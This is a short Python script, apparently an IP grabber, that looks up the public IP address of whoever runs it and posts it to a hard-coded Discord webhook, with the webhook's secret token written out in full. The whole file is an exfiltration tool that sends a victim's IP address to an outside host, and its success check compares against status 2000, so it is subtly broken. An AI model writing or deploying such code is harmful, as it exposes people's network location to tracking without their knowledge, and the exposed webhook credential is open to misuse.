import requests



ip = requests.get('https://api.ipify.org').text
#Gets the IP address



payload = {
    'content': f'Ip Adress is: {ip}'
}


response = requests.post('https://discord.com/api/webhooks/1216505653062012938/SduZRHFCv69_L4683R1mkBBHSRT7w25sMsq3eo8ekwR6dH3rKffF_x_VszF0mrDLO9_C', json=payload)
#sends ip address to my specific disc channcel



if response.status_code == 2000:
    print("Message sent successfully.")
else:
    print("Message wasn't successful.")